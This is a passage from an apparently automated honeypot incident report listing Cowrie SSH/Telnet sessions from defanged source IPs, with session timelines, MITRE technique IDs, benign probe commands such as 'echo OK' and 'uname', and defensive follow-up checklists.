| `2026-07-11 17:15:15` | `cowrie.client.kex` |
| `2026-07-11 17:15:17` | `cowrie.login.success` |
| `2026-07-11 17:15:19` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.171.135[.]254` to AbuseIPDB if not already reported
- [ ] Block `60.171.135[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52eec0ba72af

| Field | Detail |
|---|---|
| **Source IP** | `120.48.26[.]113` |
| **First Seen** | 2026-07-11 17:15 |
| **Last Seen** | 2026-07-11 17:16 |
| **Session Duration** | 84s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:15:14` | `cowrie.session.connect` |
| `2026-07-11 17:15:14` | `cowrie.client.version` |
| `2026-07-11 17:15:15` | `cowrie.client.kex` |
| `2026-07-11 17:16:38` | `cowrie.login.success` |
| `2026-07-11 17:16:39` | `cowrie.session.params` |
| `2026-07-11 17:16:39` | `cowrie.command.input` |
| `2026-07-11 17:16:39` | `cowrie.log.closed` |
| `2026-07-11 17:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.26[.]113` to AbuseIPDB if not already reported
- [ ] Block `120.48.26[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea63bcc796b8

| Field | Detail |
|---|---|
| **Source IP** | `65.20.179[.]251` |
| **First Seen** | 2026-07-11 17:18 |
| **Last Seen** | 2026-07-11 17:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:18:00` | `cowrie.session.connect` |
| `2026-07-11 17:18:00` | `cowrie.client.version` |
| `2026-07-11 17:18:00` | `cowrie.client.kex` |
| `2026-07-11 17:18:02` | `cowrie.login.success` |
| `2026-07-11 17:18:02` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.179[.]251` to AbuseIPDB if not already reported
- [ ] Block `65.20.179[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28c115f62166

| Field | Detail |
|---|---|
| **Source IP** | `60.166.31[.]198` |
| **First Seen** | 2026-07-11 17:24 |
| **Last Seen** | 2026-07-11 17:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:24:34` | `cowrie.session.connect` |
| `2026-07-11 17:24:36` | `cowrie.client.version` |
| `2026-07-11 17:24:36` | `cowrie.client.kex` |
| `2026-07-11 17:24:39` | `cowrie.login.success` |
| `2026-07-11 17:24:41` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:24:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.31[.]198` to AbuseIPDB if not already reported
- [ ] Block `60.166.31[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48c063103653

| Field | Detail |
|---|---|
| **Source IP** | `102.211.7[.]162` |
| **First Seen** | 2026-07-11 17:24 |
| **Last Seen** | 2026-07-11 17:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:24:49` | `cowrie.session.connect` |
| `2026-07-11 17:24:50` | `cowrie.client.version` |
| `2026-07-11 17:24:50` | `cowrie.client.kex` |
| `2026-07-11 17:24:51` | `cowrie.login.success` |
| `2026-07-11 17:24:51` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.211.7[.]162` to AbuseIPDB if not already reported
- [ ] Block `102.211.7[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff70d965c9aa

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-11 17:26 |
| **Last Seen** | 2026-07-11 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:26:14` | `cowrie.session.connect` |
| `2026-07-11 17:26:14` | `cowrie.client.version` |
| `2026-07-11 17:26:14` | `cowrie.client.kex` |
| `2026-07-11 17:26:15` | `cowrie.login.success` |
| `2026-07-11 17:26:16` | `cowrie.session.params` |
| `2026-07-11 17:26:16` | `cowrie.command.input` |
| `2026-07-11 17:26:16` | `cowrie.log.closed` |
| `2026-07-11 17:26:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7bdcb98321c

| Field | Detail |
|---|---|
| **Source IP** | `85.195.9[.]20` |
| **First Seen** | 2026-07-11 17:28 |
| **Last Seen** | 2026-07-11 17:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:28:02` | `cowrie.session.connect` |
| `2026-07-11 17:28:03` | `cowrie.client.version` |
| `2026-07-11 17:28:03` | `cowrie.client.kex` |
| `2026-07-11 17:28:04` | `cowrie.login.success` |
| `2026-07-11 17:28:04` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.195.9[.]20` to AbuseIPDB if not already reported
- [ ] Block `85.195.9[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-541d290a934b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 17:34 |
| **Last Seen** | 2026-07-11 17:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:34:00` | `cowrie.session.connect` |
| `2026-07-11 17:34:01` | `cowrie.client.version` |
| `2026-07-11 17:34:01` | `cowrie.client.kex` |
| `2026-07-11 17:34:03` | `cowrie.login.success` |
| `2026-07-11 17:34:04` | `cowrie.session.params` |
| `2026-07-11 17:34:04` | `cowrie.command.input` |
| `2026-07-11 17:34:04` | `cowrie.log.closed` |
| `2026-07-11 17:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-022cc8618791

| Field | Detail |
|---|---|
| **Source IP** | `112.197.2[.]116` |
| **First Seen** | 2026-07-11 17:36 |
| **Last Seen** | 2026-07-11 17:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:36:59` | `cowrie.session.connect` |
| `2026-07-11 17:36:59` | `cowrie.client.version` |
| `2026-07-11 17:36:59` | `cowrie.client.kex` |
| `2026-07-11 17:37:00` | `cowrie.login.success` |
| `2026-07-11 17:37:01` | `cowrie.session.params` |
| `2026-07-11 17:37:01` | `cowrie.command.input` |
| `2026-07-11 17:37:02` | `cowrie.log.closed` |
| `2026-07-11 17:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.197.2[.]116` to AbuseIPDB if not already reported
- [ ] Block `112.197.2[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-086cb1e24d40

| Field | Detail |
|---|---|
| **Source IP** | `212.3.154[.]183` |
| **First Seen** | 2026-07-11 17:37 |
| **Last Seen** | 2026-07-11 17:38 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:37:50` | `cowrie.session.connect` |
| `2026-07-11 17:37:51` | `cowrie.client.version` |
| `2026-07-11 17:37:51` | `cowrie.client.kex` |
| `2026-07-11 17:37:59` | `cowrie.login.success` |
| `2026-07-11 17:38:02` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.3.154[.]183` to AbuseIPDB if not already reported
- [ ] Block `212.3.154[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6396e0de773d

| Field | Detail |
|---|---|
| **Source IP** | `196.190.180[.]18` |
| **First Seen** | 2026-07-11 17:38 |
| **Last Seen** | 2026-07-11 17:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:38:10` | `cowrie.session.connect` |
| `2026-07-11 17:38:10` | `cowrie.client.version` |
| `2026-07-11 17:38:10` | `cowrie.client.kex` |
| `2026-07-11 17:38:12` | `cowrie.login.success` |
| `2026-07-11 17:38:12` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.180[.]18` to AbuseIPDB if not already reported
- [ ] Block `196.190.180[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b94425fc1c1b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-11 17:40 |
| **Last Seen** | 2026-07-11 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:40:33` | `cowrie.session.connect` |
| `2026-07-11 17:40:33` | `cowrie.client.version` |
| `2026-07-11 17:40:33` | `cowrie.client.kex` |
| `2026-07-11 17:40:33` | `cowrie.login.success` |
| `2026-07-11 17:40:34` | `cowrie.session.params` |
| `2026-07-11 17:40:34` | `cowrie.command.input` |
| `2026-07-11 17:40:34` | `cowrie.log.closed` |
| `2026-07-11 17:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b044440edb9

| Field | Detail |
|---|---|
| **Source IP** | `41.214.10[.]178` |
| **First Seen** | 2026-07-11 17:41 |
| **Last Seen** | 2026-07-11 17:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:41:27` | `cowrie.session.connect` |
| `2026-07-11 17:41:28` | `cowrie.client.version` |
| `2026-07-11 17:41:28` | `cowrie.client.kex` |
| `2026-07-11 17:41:29` | `cowrie.login.success` |
| `2026-07-11 17:41:30` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:41:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.214.10[.]178` to AbuseIPDB if not already reported
- [ ] Block `41.214.10[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c17831f7141

| Field | Detail |
|---|---|
| **Source IP** | `86.153.178[.]149` |
| **First Seen** | 2026-07-11 17:42 |
| **Last Seen** | 2026-07-11 17:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:42:46` | `cowrie.session.connect` |
| `2026-07-11 17:42:48` | `cowrie.telnet.option` |
| `2026-07-11 17:42:50` | `cowrie.telnet.option` |
| `2026-07-11 17:43:51` | `cowrie.login.success` |
| `2026-07-11 17:43:51` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `86.153.178[.]149` to AbuseIPDB if not already reported
- [ ] Block `86.153.178[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4c69e42416c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 17:48 |
| **Last Seen** | 2026-07-11 17:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:48:01` | `cowrie.session.connect` |
| `2026-07-11 17:48:01` | `cowrie.client.version` |
| `2026-07-11 17:48:01` | `cowrie.client.kex` |
| `2026-07-11 17:48:02` | `cowrie.login.success` |
| `2026-07-11 17:48:03` | `cowrie.session.params` |
| `2026-07-11 17:48:03` | `cowrie.command.input` |
| `2026-07-11 17:48:03` | `cowrie.log.closed` |
| `2026-07-11 17:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00cc72bcaf3b

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-11 17:54 |
| **Last Seen** | 2026-07-11 17:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:54:51` | `cowrie.session.connect` |
| `2026-07-11 17:54:51` | `cowrie.client.version` |
| `2026-07-11 17:54:51` | `cowrie.client.kex` |
| `2026-07-11 17:54:53` | `cowrie.login.success` |
| `2026-07-11 17:54:53` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7f35ef6b280

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-11 17:54 |
| **Last Seen** | 2026-07-11 17:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:54:55` | `cowrie.session.connect` |
| `2026-07-11 17:54:55` | `cowrie.client.version` |
| `2026-07-11 17:54:55` | `cowrie.client.kex` |
| `2026-07-11 17:54:55` | `cowrie.login.success` |
| `2026-07-11 17:54:56` | `cowrie.session.params` |
| `2026-07-11 17:54:56` | `cowrie.command.input` |
| `2026-07-11 17:54:56` | `cowrie.log.closed` |
| `2026-07-11 17:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-390490f00f05

| Field | Detail |
|---|---|
| **Source IP** | `111.17.213[.]162` |
| **First Seen** | 2026-07-11 17:54 |
| **Last Seen** | 2026-07-11 17:55 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:54:59` | `cowrie.session.connect` |
| `2026-07-11 17:55:01` | `cowrie.client.version` |
| `2026-07-11 17:55:01` | `cowrie.client.kex` |
| `2026-07-11 17:55:06` | `cowrie.login.success` |
| `2026-07-11 17:55:07` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.17.213[.]162` to AbuseIPDB if not already reported
- [ ] Block `111.17.213[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1295cc27b336

| Field | Detail |
|---|---|
| **Source IP** | `101.96.192[.]88` |
| **First Seen** | 2026-07-11 18:00 |
| **Last Seen** | 2026-07-11 18:05 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:00:45` | `cowrie.session.connect` |
| `2026-07-11 18:00:45` | `cowrie.client.version` |
| `2026-07-11 18:00:45` | `cowrie.client.kex` |
| `2026-07-11 18:00:46` | `cowrie.login.success` |
| `2026-07-11 18:05:46` | `cowrie.session.file_upload` |
| `2026-07-11 18:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.192[.]88` to AbuseIPDB if not already reported
- [ ] Block `101.96.192[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c380ae5a66be

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-07-11 18:04 |
| **Last Seen** | 2026-07-11 18:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:04:23` | `cowrie.session.connect` |
| `2026-07-11 18:04:24` | `cowrie.client.version` |
| `2026-07-11 18:04:24` | `cowrie.client.kex` |
| `2026-07-11 18:04:26` | `cowrie.login.success` |
| `2026-07-11 18:04:27` | `cowrie.direct-tcpip.request` |
| `2026-07-11 18:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a2ed5992b3b

| Field | Detail |
|---|---|
| **Source IP** | `62.220.104[.]155` |
| **First Seen** | 2026-07-11 18:04 |
| **Last Seen** | 2026-07-11 18:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:04:37` | `cowrie.session.connect` |
| `2026-07-11 18:04:37` | `cowrie.client.version` |
| `2026-07-11 18:04:37` | `cowrie.client.kex` |
| `2026-07-11 18:04:39` | `cowrie.login.success` |
| `2026-07-11 18:04:39` | `cowrie.direct-tcpip.request` |
| `2026-07-11 18:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.220.104[.]155` to AbuseIPDB if not already reported
- [ ] Block `62.220.104[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11281fd18bff

| Field | Detail |
|---|---|
| **Source IP** | `65.20.158[.]10` |
| **First Seen** | 2026-07-11 18:06 |
| **Last Seen** | 2026-07-11 18:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:06:53` | `cowrie.session.connect` |
| `2026-07-11 18:06:54` | `cowrie.client.version` |
| `2026-07-11 18:06:54` | `cowrie.client.kex` |
| `2026-07-11 18:06:57` | `cowrie.login.success` |
| `2026-07-11 18:06:58` | `cowrie.direct-tcpip.request` |
| `2026-07-11 18:07:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.158[.]10` to AbuseIPDB if not already reported
- [ ] Block `65.20.158[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ea16726e547

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 18:06 |
| **Last Seen** | 2026-07-11 18:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:06:58` | `cowrie.session.connect` |
| `2026-07-11 18:06:58` | `cowrie.client.version` |
| `2026-07-11 18:06:58` | `cowrie.client.kex` |
| `2026-07-11 18:06:59` | `cowrie.login.success` |
| `2026-07-11 18:07:00` | `cowrie.session.params` |
| `2026-07-11 18:07:00` | `cowrie.command.input` |
| `2026-07-11 18:07:01` | `cowrie.log.closed` |
| `2026-07-11 18:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565f3b515895

| Field | Detail |
|---|---|
| **Source IP** | `66.45.144[.]201` |
| **First Seen** | 2026-07-11 18:07 |
| **Last Seen** | 2026-07-11 18:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:07:58` | `cowrie.session.connect` |
| `2026-07-11 18:07:58` | `cowrie.client.version` |
| `2026-07-11 18:07:58` | `cowrie.client.kex` |
| `2026-07-11 18:07:59` | `cowrie.login.success` |
| `2026-07-11 18:08:00` | `cowrie.direct-tcpip.request` |
| `2026-07-11 18:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.144[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.144[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-837aa4428d31

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]26` |
| **First Seen** | 2026-07-11 18:08 |
| **Last Seen** | 2026-07-11 18:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:08:08` | `cowrie.session.connect` |
| `2026-07-11 18:08:09` | `cowrie.client.version` |
| `2026-07-11 18:08:09` | `cowrie.client.kex` |
| `2026-07-11 18:08:11` | `cowrie.login.success` |
| `2026-07-11 18:08:11` | `cowrie.direct-tcpip.request` |
| `2026-07-11 18:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]26` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebc0f0b3d952

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-11 18:09 |
| **Last Seen** | 2026-07-11 18:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:09:13` | `cowrie.session.connect` |
| `2026-07-11 18:09:13` | `cowrie.client.version` |
| `2026-07-11 18:09:13` | `cowrie.client.kex` |
| `2026-07-11 18:09:14` | `cowrie.login.success` |
| `2026-07-11 18:09:15` | `cowrie.session.params` |
| `2026-07-11 18:09:15` | `cowrie.command.input` |
| `2026-07-11 18:09:15` | `cowrie.log.closed` |
| `2026-07-11 18:09:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3450f74e3eac

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 18:21 |
| **Last Seen** | 2026-07-11 18:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:21:10` | `cowrie.session.connect` |
| `2026-07-11 18:21:10` | `cowrie.client.version` |
| `2026-07-11 18:21:10` | `cowrie.client.kex` |
| `2026-07-11 18:21:11` | `cowrie.login.success` |
| `2026-07-11 18:21:12` | `cowrie.session.params` |
